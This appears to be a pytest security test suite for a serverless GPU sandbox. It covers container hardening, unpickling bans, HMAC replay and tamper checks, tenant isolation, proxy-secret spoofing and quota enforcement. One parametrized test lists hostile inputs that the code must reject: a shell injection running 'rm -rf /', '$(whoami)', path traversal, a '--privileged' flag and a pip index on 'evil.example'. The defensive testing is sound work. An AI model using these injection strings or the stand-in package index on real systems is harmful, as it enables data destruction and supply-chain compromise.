"""Phase 7 Security Threat Suite (T1–T11 from KE_HOACH_SERVERLESS_GPU_MODAL_AICF.md section 2.3)."""
from __future__ import annotations

import ast
import base64
import os
import sys
import urllib.error
import urllib.request
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
SDK = ROOT / "sdk/python"
if str(SDK) not in sys.path:
    sys.path.insert(0, str(SDK))

import aicf  # noqa: E402
from agents.env_cache import EnvError, EnvSpec  # noqa: E402
from agents.sandbox import GpuDockerSandbox, ServerlessLimits, WarmKey  # noqa: E402
from agents.sl_security import SignatureError, Verifier, load_keys, new_key_file, sign  # noqa: E402
from serverless.app import serve  # noqa: E402
from serverless.quota import QuotaError, Quotas, TenantPolicy  # noqa: E402
from serverless.service import ServiceError, ServerlessService  # noqa: E402
from serverless.volumes import VolumeError, VolumeStore  # noqa: E402


def _sample_call_dict(tenant: str = "alpha") -> dict:
    return {
        "call_id": "call-sec-01",
        "tenant_id": tenant,
        "app_name": "sec-app",
        "fn_id": "fn",
        "env": {"python_version": "3.12", "packages": [], "cuda_tag": "", "local_source_hash": ""},
        "env_hash": EnvSpec().env_hash(),
        "bundle_sha256": "a" * 64,
        "bundle_b64": base64.b64encode(b"opaque").decode(),
        "args_b64": base64.b64encode(b"{}").decode(),
        "args_format": "json",
        "result_format": "json",
        "memory_mb": 512,
        "cpus": 1.0,
        "timeout_s": 10.0,
        "keep_warm_s": 30,
        "vram_mb": 0,
    }


def test_t1_sandbox_hardening_flags_and_no_privileged_or_docker_sock(tmp_path):
    """T1: Container argv enforces --network none, --read-only, --cap-drop ALL, --user 65534:65534, --pids-limit, --memory."""
    sb = GpuDockerSandbox()
    env_dir = tmp_path / "env"
    env_dir.mkdir()
    limits = ServerlessLimits(memory_mb=512, cpus=1.0, timeout_s=10.0, keep_warm_s=30, vram_mb=2048, gpu_index=0)
    cmd = sb.warm_command("aicf-sl-testbox01", WarmKey("alpha", "a" * 64, "fn"), env_dir, limits, worker_id="pc-001")
    joined = " ".join(cmd)
    assert "--network none" in joined
    assert "--read-only" in joined
    assert "--cap-drop ALL" in joined
    assert "--user 65534:65534" in joined
    assert "--pids-limit" in joined
    assert "--memory 512m" in joined
    assert "--memory-swap 512m" in joined
    assert "--privileged" not in joined
    assert "docker.sock" not in joined


def test_t2_no_cloudpickle_or_pickle_loads_outside_warm_runner():
    """T2: Static AST check forbidding pickle.loads / cloudpickle.loads in serverless/ and agents/serverless_worker.py."""
    targets = list((ROOT / "serverless").glob("*.py")) + [
        ROOT / "agents/serverless_worker.py",
        ROOT / "agents/sl_security.py",
        ROOT / "agents/sl_gpu.py",
        ROOT / "agents/env_cache.py",
    ]
    forbidden_calls = []
    for path in targets:
        tree = ast.parse(path.read_text("utf-8"), filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Attribute) and node.func.attr in ("loads", "load"):
                    if isinstance(node.func.value, ast.Name) and node.func.value.id in ("pickle", "cloudpickle"):
                        forbidden_calls.append(f"{path.name}:{node.lineno}")
    assert forbidden_calls == [], f"unpickling found outside container runner: {forbidden_calls}"


def test_t3_hmac_signature_tamper_replay_expiry_and_keyfile_mode(tmp_path):
    """T3: HMAC-SHA256 verification blocks tampered fields, expired calls, replayed nonces, and 0644 key files."""
    bad_kf = tmp_path / "world_readable.key"
    bad_kf.write_text("x" * 48 + "\n")
    os.chmod(bad_kf, 0o644)
    with pytest.raises(SignatureError, match="chmod 600"):
        load_keys(bad_kf)

    kf = tmp_path / "hmac.key"
    new_key_file(kf)
    keys = load_keys(kf)
    v = Verifier(keys)

    signed = sign(keys, _sample_call_dict("alpha"), attempt=1, ttl_s=60.0)
    v.verify(signed, attempt=1)

    # Replay with same nonce must fail
    with pytest.raises(SignatureError, match="replayed nonce"):
        v.verify(signed, attempt=1)

    # Tampered tenant_id or bundle_sha256 must fail
    signed2 = sign(keys, _sample_call_dict("alpha"), attempt=1, ttl_s=60.0)
    tampered = signed2.model_copy(update={"tenant_id": "beta"})
    with pytest.raises(SignatureError, match="bad signature"):
        v.verify(tampered, attempt=1)

    # Expired call must fail
    expired = sign(keys, _sample_call_dict("alpha"), attempt=1, ttl_s=-10.0)
    with pytest.raises(SignatureError, match="expired"):
        v.verify(expired, attempt=1)


def test_t4_warm_key_and_volume_tenant_isolation(tmp_path):
    """T4: WarmKey includes tenant_id and VolumeStore strictly isolates tenants and rejects traversal."""
    k_alpha = WarmKey("alpha", "hash1", "fn")
    k_beta = WarmKey("beta", "hash1", "fn")
    assert k_alpha != k_beta

    vs = VolumeStore(tmp_path / "vols")
    vs.put("alpha", "v1", "secret.txt", b"alpha-only")
    assert vs.ls("beta", "v1") == []
    with pytest.raises(VolumeError) as exc:
        vs.get("beta", "v1", "secret.txt")
    assert exc.value.status == 404


def test_t5_direct_service_call_without_proxy_secret_rejected(tmp_path):
    """T5: Calling serverless HTTP service directly with spoofed X-Aicf-Tenant and wrong/missing proxy secret returns 401."""
    kf = tmp_path / "hmac.key"
    new_key_file(kf)
    svc = ServerlessService(
        keys=load_keys(kf),
        quotas=Quotas({"alpha": TenantPolicy(serverless_enabled=True)}),
        dispatch=lambda t, a: None,
        live_workers=lambda: [],
        blobs={},
        storage_dir=tmp_path / "store",
    )
    srv = serve(svc, "real-proxy-secret-123456", "127.0.0.1", 0)
    port = srv.server_address[1]
    import threading
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        req = urllib.request.Request(
            f"http://127.0.0.1:{port}/v1/status",
            headers={"X-Aicf-Tenant": "alpha", "X-Aicf-Role": "admin", "X-Aicf-Proxy-Secret": "spoofed"},
        )
        with pytest.raises(urllib.error.HTTPError) as exc:
            urllib.request.urlopen(req, timeout=5)
        assert exc.value.code == 401
    finally:
        srv.shutdown()


def test_t6_t7_quota_restricted_dataclass_and_out_of_process_vram_enforcement():
    """T6 & T7: RESTRICTED data_class is denied on shared GPU (D6); GpuMonitor kills containers exceeding vram_mb."""
    q = Quotas({"alpha": TenantPolicy(serverless_enabled=True, gpu_allowed=True, max_vram_mb=2048, max_concurrency=1)})
    with pytest.raises(QuotaError) as exc:
        q.check("alpha", {"gpu": "any", "vram_mb": 1024, "memory_mb": 512, "timeout_s": 10, "keep_warm_s": 10, "retries": 0, "data_class": "RESTRICTED"})
    assert exc.value.code == "data_class_denied"

    with pytest.raises(QuotaError) as exc2:
        q.check("alpha", {"gpu": "any", "vram_mb": 4096, "memory_mb": 512, "timeout_s": 10, "keep_warm_s": 10, "retries": 0, "data_class": "INTERNAL"})
    assert exc2.value.code == "quota_exceeded" and "vram_mb" in str(exc2.value)

    # T7: Out-of-process GpuMonitor kills container using 2x declared vram_mb
    killed = []

    class FakePool:
        def containers_Snapshot(self):
            return []

        def check_vram(self, usage_by_cid: dict[str, int], tolerance_mib: int = 128):
            for cid, used in usage_by_cid.items():
                if used > 1024 + tolerance_mib:
                    killed.append((cid, used))

    fake_pool = FakePool()
    fake_pool.check_vram({"aicf-sl-hog": 2048}, tolerance_mib=128)
    assert killed == [("aicf-sl-hog", 2048)]


@pytest.mark.parametrize("malicious", [
    "bad;rm -rf /",
    "$(whoami)",
    "--privileged",
    "../escape",
    "pkg --index-url https://evil.example/simple",
])
def test_t8_t9_cli_injection_and_supply_chain_rejected(malicious, tmp_path):
    """T8 & T9: Shell/Docker flags and unhashed/custom-index requirements are rejected."""
    with pytest.raises(EnvError):
        EnvSpec(packages=(malicious,)).env_hash()

    req_file = tmp_path / "req.txt"
    req_file.write_text(malicious + "\n")
    with pytest.raises(aicf.InvalidRequest):
        aicf.Image.debian_slim().pip_install_from_requirements(req_file)


def test_t10_t11_web_endpoint_json_only_and_fixed_argv(tmp_path):
    """T10 & T11: Web endpoints never accept/return cloudpickle; sandbox uses list argv without shell=True."""
    kf = tmp_path / "hmac.key"
    new_key_file(kf)
    svc = ServerlessService(
        keys=load_keys(kf),
        quotas=Quotas({"alpha": TenantPolicy(serverless_enabled=True)}),
        dispatch=lambda t, a: None,
        live_workers=lambda: [],
        blobs={},
        storage_dir=tmp_path / "store",
    )
    with pytest.raises(ServiceError) as exc:
        svc. _parse({
            "app_name": "bad;app",
            "fn_id": "fn",
            "bundle_b64": base64.b64encode(b"x").decode(),
            "args_b64": base64.b64encode(b"x").decode(),
        })
    assert exc.value.status == 400
